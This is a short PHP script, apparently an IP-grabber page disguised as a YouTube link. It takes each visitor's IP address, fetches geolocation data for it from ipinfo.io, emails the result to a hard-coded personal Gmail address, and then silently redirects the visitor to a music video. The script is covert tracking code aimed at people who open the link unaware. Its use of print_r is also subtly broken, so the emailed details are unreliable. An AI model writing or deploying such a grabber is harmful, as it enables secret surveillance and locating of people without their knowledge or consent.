<?php
$ip = $_SERVER['REMOTE_ADDR'];
$dest = 'e.boffetti99@gmail.com';
$oggetto = 'Nuovo indirizzo IP';
$details = json_encode(file_get_contents("http://ipinfo.io/{$ip}/json"));
$messaggio = print_r($details);
mail($dest, $oggetto, print_r($details));
header('HTTP/1.1 301 Moved Permanently');
header('Location: https://www.youtube.com/watch?v=nlYE4XBPSkQ&ab_channel=NoemiVEVO');
exit;
?>
